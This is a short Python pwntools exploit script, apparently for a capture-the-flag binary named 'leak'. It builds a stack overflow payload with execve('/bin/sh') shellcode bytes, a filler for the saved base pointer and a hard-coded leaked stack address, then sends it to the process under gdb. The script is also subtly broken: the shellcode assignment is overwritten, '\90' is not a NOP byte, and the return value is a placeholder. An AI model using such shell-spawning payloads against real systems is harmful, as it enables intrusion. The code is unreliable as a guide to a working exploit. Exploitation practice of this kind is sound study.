
from pwn import *

LEAK = 0x7fffffffe6f0
#SHELLCODE = asm(pwnlib.shellcraft.amd64.linux.sh())
s = process("./leak")

# Uncomment for debugging
#s = process("./main")
gdb.attach(s, 'b*0x000000000040088e')

payload = '\90'*21
payload = '\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'
payload = '\90'*20
payload += 'BBBBBBBB' # RBP
payload += p64(LEAK)
payload += p64(0x41) # RET

payload += '\n'
s.send(payload)
print(s.recv())
s.close()
